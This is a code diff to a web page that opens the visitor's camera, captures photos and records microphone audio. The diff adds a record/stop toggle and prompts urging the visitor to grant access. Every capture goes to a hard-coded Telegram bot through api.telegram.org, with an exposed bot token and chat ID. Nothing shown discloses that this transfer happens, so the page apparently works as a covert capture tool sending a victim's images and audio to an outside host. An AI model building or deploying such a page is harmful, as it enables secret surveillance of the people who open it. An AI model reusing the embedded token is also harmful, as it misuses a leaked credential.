@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -22,18 +23,21 @@
     const video = document.getElementById('video');
     const captureBtn = document.getElementById('captureBtn');
     const recordAudioBtn = document.getElementById('recordAudioBtn');
+    let mediaRecorder;
+    let isRecording = false;
 
-    // 1. Start the camera video stream
+    // Start the camera video stream
     async function startCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
         video.srcObject = stream;
       } catch (err) {
-        console.error('Error accessing camera: ', err);
+        alert('Error accessing camera. Please allow camera access and reload the page.');
+        console.error('Error accessing camera:', err);
       }
     }
 
-    // 2. Capture photo from video stream
+    // Capture photo from video stream
     captureBtn.addEventListener('click', () => {
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth;
@@ -46,37 +50,44 @@
       }, 'image/jpeg');
     });
 
-    // 3. Record audio using MediaRecorder
+    // Record audio using MediaRecorder
     recordAudioBtn.addEventListener('click', async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
+      if (!isRecording) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+          mediaRecorder = new MediaRecorder(stream);
+          const chunks = [];
 
-        mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
-        mediaRecorder.onstop = async () => {
-          const audioBlob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-          await sendToTelegram(audioBlob, 'audio');  // Send recorded audio to Telegram
-        };
+          mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
+          mediaRecorder.onstop = async () => {
+            const audioBlob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+            await sendToTelegram(audioBlob, 'audio');  // Send recorded audio to Telegram
+          };
 
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 5000);  // Stop recording after 5 seconds
-      } catch (err) {
-        console.error('Error accessing microphone: ', err);
+          mediaRecorder.start();
+          isRecording = true;
+          recordAudioBtn.textContent = "Stop Recording";
+        } catch (err) {
+          alert('Error accessing microphone. Please allow microphone access and try again.');
+          console.error('Error accessing microphone:', err);
+        }
+      } else {
+        mediaRecorder.stop();
+        isRecording = false;
+        recordAudioBtn.textContent = "Record Audio";
       }
     });
 
-    // 4. Function to send media to Telegram
+    // Function to send media to Telegram
     async function sendToTelegram(blob, type) {
       const botToken = '7783174245:AAHArvpKS5IegITerWZJ44BtGl1S6ssxs2U';
       const chatId = '7532339931';  // Replace with the chat ID to send the media to
 
       const formData = new FormData();
-      formData.append(type, blob, `${type}.${type === 'photo' ? 'jpg' : 'ogg'}`);
+      formData.append(type === 'photo' ? 'photo' : 'audio', blob, `${type}.${type === 'photo' ? 'jpg' : 'ogg'}`);
+      formData.append('chat_id', chatId);
 
       const endpoint = `https://api.telegram.org/bot${botToken}/${type === 'photo' ? 'sendPhoto' : 'sendAudio'}`;
-
-      formData.append('chat_id', chatId);
 
       try {
         const response = await fetch(endpoint, {
